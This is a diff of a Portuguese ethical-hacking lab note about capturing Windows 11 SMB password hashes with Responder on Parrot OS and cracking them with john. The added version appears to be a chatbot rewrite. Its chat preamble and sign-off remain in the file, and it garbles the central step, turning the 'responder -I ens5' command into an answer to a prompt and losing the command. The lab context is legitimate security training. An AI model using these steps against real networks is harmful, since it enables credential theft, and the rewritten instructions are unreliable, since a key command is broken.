@@ -1,23 +1,59 @@
+Claro, vou atualizar e organizar o texto com as informações fornecidas:
+
+---
 
 ### Imagens e Configurações de Instâncias
 
 - **win11 c5large 65gb**
 - **Parrot OS c5 65gb**
 
-comando para partilhar pasta
+### Parrot OS
+
+#### Comando para Partilhar Pasta via SMB
+
+Para partilhar uma pasta no Parrot OS, execute o seguinte comando:
+
+```bash
 sudo net usershare add sharefolder /home/parrot/sharefolder "A secret folder shared via SMB" everyone:F guest_ok=y
-executar
-responder -I ens5
+```
 
-no win11 run: \\ip privado do parrot
-tentar meter a pass vai dar erro e aparace o hash no parrot
-![image](https://github.com/pinhers/Ethical-Hacking/assets/145346889/3dfce7ff-cc32-45aa-870b-d50793e12673)
+Quando solicitado, responda com `-I ens5`.
 
+#### Acessar Pasta Compartilhada no Windows 11
 
-parrot-logs:
+1. No Windows 11, pressione `Win + R` para abrir o Executar.
+2. Digite `\\[IP_privado_do_Parrot]` e pressione Enter.
+
+> **Nota:** Ao tentar colocar a senha, pode ocorrer um erro e aparecerá o hash no Parrot OS.
+
+#### Logs do Responder no Parrot OS
+
+Os logs do Responder são armazenados no seguinte diretório:
+
+```plaintext
 /usr/share/responder/logs
-john SMB-xxxxxxxx- TAB
+```
 
-troubleshot:
-sudo lsof -i :445
-sudo systemctl stop smbd
+Para processar os hashes capturados, utilize o `john`:
+
+```bash
+john SMB-xxxxxxxx- TAB
+```
+
+### Troubleshooting
+
+Se precisar resolver problemas relacionados ao SMB, use os seguintes comandos:
+
+1. Verificar quais processos estão utilizando a porta 445:
+    ```bash
+    sudo lsof -i :445
+    ```
+
+2. Parar o serviço `smbd`:
+    ```bash
+    sudo systemctl stop smbd
+    ```
+
+---
+
+Se precisar de mais alguma coisa ou ajustes adicionais, estou à disposição!
